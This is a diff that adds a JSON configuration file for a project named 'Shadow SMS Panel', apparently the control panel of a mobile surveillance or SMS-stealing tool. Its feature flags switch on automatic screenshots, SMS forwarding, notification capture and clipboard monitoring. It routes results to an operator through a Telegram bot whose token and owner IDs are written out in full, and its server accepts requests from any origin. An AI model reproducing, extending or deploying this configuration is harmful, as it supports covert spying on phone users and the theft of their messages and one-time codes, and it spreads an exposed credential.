@@ -1,0 +1,24 @@
+{
+  "project_name": "Shadow SMS Panel",
+  "version": "2.0.0",
+  "developer": "Shadow",
+  "telegram": {
+    "token": "8630366828:AAGzZQMflT0KvAU3RNzX6y0h-BPeOtglblQ",
+    "owner_ids": [
+      "7848300179"
+    ],
+    "notification_interval": 5
+  },
+  "server": {
+    "port": 3000,
+    "cors_origins": [
+      "*"
+    ]
+  },
+  "features": {
+    "auto_screenshot": true,
+    "auto_sms_forward": true,
+    "notification_capture": true,
+    "clipboard_monitor": true
+  }
+}
